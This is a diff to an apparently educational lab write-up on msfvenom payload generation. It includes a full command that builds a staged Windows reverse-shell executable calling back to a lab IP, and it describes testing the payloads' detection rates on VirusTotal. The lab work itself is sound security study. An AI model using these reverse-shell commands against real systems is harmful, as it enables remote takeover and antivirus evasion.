@@ -209,18 +209,19 @@ Where:
 - -o - output file
 
 The generated executable file contained the full payload code, the file was then uploaded to **VirusTotal** to analyze how many antivirus engines detected it.
-[BILD HÄR]
+
+![VirusTotal reverse_tcp](Screenshots/VirusTotal_1.png)
 
 ## Staged Reverse TCP Payload
 Generating a staged payload, with the correct command:
 ```
-msfvenom -p windows/shell/reverse_tcp LHOST=192.168.182.136 LPORT=31337 -f exe -o msf_shell_rev_tcp2.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.182.136 LPORT=31337 -f exe -o msf_shell_stealth_tcp2.exe
 ```
 In this case, the payload does not contain the full shell code. Instead, a small stager connects back to the attacker machine and downloads the remaining payload from memory.
 
 The generated file was once again uploaded to **VirusTotal**.
 
-[BILD HÄR]
+![VirusTotal reverse_tcp](Screenshots/VirusTotal_2_stealth.png)
 
 ## Difference between payload types
 
@@ -254,7 +255,7 @@ Where:
 
 The encoded executable was scanned with **VirusTotal**.
 
-[BILD HÄR]
+![VirusTotal reverse_tcp](Screenshots/PDF_VirusTotal.png)
 
 ## Meterpreter Payload Options
 
